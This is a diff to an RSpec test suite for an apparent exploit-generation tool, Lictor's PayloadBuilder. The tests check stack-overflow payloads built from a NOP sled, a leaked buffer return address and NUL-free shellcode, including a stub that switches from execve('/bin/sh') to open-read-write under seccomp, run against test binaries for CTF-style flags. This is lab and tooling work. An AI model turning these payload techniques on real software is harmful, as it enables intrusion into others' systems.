@@ -27,10 +27,11 @@ RSpec.describe Lictor::PayloadBuilder do
     expect(body).to eq(("A" * 16).b + [4_196_182].pack("Q<"))
   end
 
-  it "builds the shellcode payload: sled + jmp_rsp + the encoded stub" do
-    facts = "nx(\"false\").\ngadget(\"jmp_rsp\", 4196200).\n"
+  it "builds the shellcode payload: sled + the banner leak + the encoded stub" do
+    facts = "nx(\"false\").\nleaked_address(\"buf\", 140730103547632).\n"
     result = described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
-    expect(result[:ret_source]).to include("gadget:jmp_rsp")
+    expect(result[:ret_source]).to include("leaked_address:buf")
+    expect(result[:ret]).to eq(140_730_103_547_632)
     body = File.binread(out)
     expect(body).to start_with(("\x90" * result[:offset]).b)
     expect(body.bytesize).to be > result[:offset] + 8
@@ -45,7 +46,7 @@ RSpec.describe Lictor::PayloadBuilder do
   it "encodes a custom payload file so it crosses the strcpy channel" do
     custom = File.join(dir, "custom.sc")
     File.binwrite(custom, "\xcc" * 11)
-    facts = "gadget(\"jmp_rsp\", 99).\n"
+    facts = "leaked_address(\"buf\", 99).\n"
     described_class.build(binary: binary, facts: facts, technique: "shellcode",
       out: out, payload_file: custom)
     body = File.binread(out)
@@ -216,7 +217,7 @@ RSpec.describe Lictor::PayloadBuilder, "the orw shellcode slot" do
     _o, err, st = Open3.capture3("gcc", "-o", runner, src)
     raise "runner build failed: #{err}" unless st.success?
 
-    code = body[(result[:offset] + 8)..] # after the sled + the jmp_rsp address
+    code = body[(result[:offset] + 8)..] # after the sled + the leak address
     out2, _e2, st2 = Open3.capture3(runner, stdin_data: code + "\nexit\n", chdir: dir)
     expect(out2).to include("FLAG{orw_slot}"), "the orw stub ran: #{out2[0, 80]}"
     expect(st2.success?).to be(true)
@@ -229,12 +230,13 @@ RSpec.describe Lictor::PayloadBuilder, "seccomp-aware shellcode" do
 
   it "execve dies under seccomp: the sh stub becomes the orw chain" do
     out = File.join(dir, "p.bin")
-    facts = "nx(\"false\").\nseccomp(\"true\").\ngadget(\"jmp_rsp\", 4196200).\n"
+    facts = "nx(\"false\").\nseccomp(\"true\").\nleaked_address(\"buf\", 140730103547632).\n"
     result = described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
     body = File.binread(out)
-    # the executed region starts at ret_slot+8 (the jmp_rsp lands the
-    # decode there): that region must cross the strcpy channel NUL-free;
-    # the return slot's own NULs are completed by the original stack
+    # the executed region starts at ret_slot+8 (the decode lands right
+    # after the return slot): that region must cross the strcpy channel
+    # NUL-free; the return slot's own NULs are completed by the original
+    # stack
     after_ret = body[(result[:offset] + 8)..]
     expect(body).not_to include("/bin/sh"), "the sh stub execve's into a killed process under seccomp"
     expect(after_ret).not_to include("\x00".b), "the orw stub crosses the strcpy channel NUL-free"
@@ -252,5 +254,17 @@ RSpec.describe Lictor::PayloadBuilder, "an explicit --technique override" do
     result = described_class.build(binary: binary, facts: facts, technique: "ret2func",
       out: out)
     expect(result[:ret_source]).to include("win_symbol:win")
+  end
+end
+
+RSpec.describe Lictor::PayloadBuilder, "the shellcode ret slot without the banner leak" do
+  let(:dir) { Dir.mktmpdir }
+  let(:binary) { ProfilerBinaryBuilder.vulnerable }
+
+  it "fails loud: the harvest never recorded the buffer address" do
+    facts = "nx(\"false\").\n" # no jmp_rsp in this binary either (0 ff e4 hits)
+    out = File.join(dir, "p.bin")
+    expect { described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out) }
+      .to raise_error(Lictor::PayloadBuilder::BuildError, /leaked_address\("buf"\)/)
   end
 end
